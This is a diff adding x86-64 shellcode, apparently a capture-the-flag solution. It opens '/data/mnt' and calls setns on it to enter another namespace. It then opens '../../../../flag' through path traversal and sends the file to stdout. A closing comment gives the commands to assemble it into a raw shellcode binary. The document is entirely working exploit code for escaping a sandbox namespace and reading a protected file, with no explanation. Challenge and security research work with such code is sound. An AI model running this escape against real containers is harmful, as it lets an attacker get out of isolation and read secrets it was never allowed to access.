@@ -1,0 +1,41 @@
+.intel_syntax noprefix
+_start:
+    push 0x74
+    mov rax, 0x6e6d2f617461642f
+    push rax
+    mov rdi, rsp
+    xor edx, edx /* 0 */
+    xor esi, esi /* 0 */
+    /* call open() */
+    push 2 /* 2 */
+    pop rax
+    syscall
+
+    mov rdi,rax
+    mov rsi,0
+    mov rax,0x134
+    syscall
+    /* push b'../../../../flag\x00' */
+    push 1
+    dec byte ptr [rsp]
+    mov rax, 0x67616c662f2e2e2f
+    push rax
+    mov rax, 0x2e2e2f2e2e2f2e2e
+    push rax
+    /* call open('rsp', 'O_RDONLY', 'rdx') */
+    push 0x2 /* 2 */
+    pop rax
+    mov rdi, rsp
+    xor esi, esi /* O_RDONLY */
+    syscall
+    /* call sendfile(1, 'rax', 0, 0x7fffffff) */
+    mov r10d, 0x7fffffff
+    mov rsi, rax
+    push 0x28 /* 0x28 */
+    pop rax
+    push 1
+    pop rdi
+    cdq /* rdx=0 */
+    syscall
+
+//gcc b.s -nostdlib && objcopy --dump-section .text=solve.bin a.out
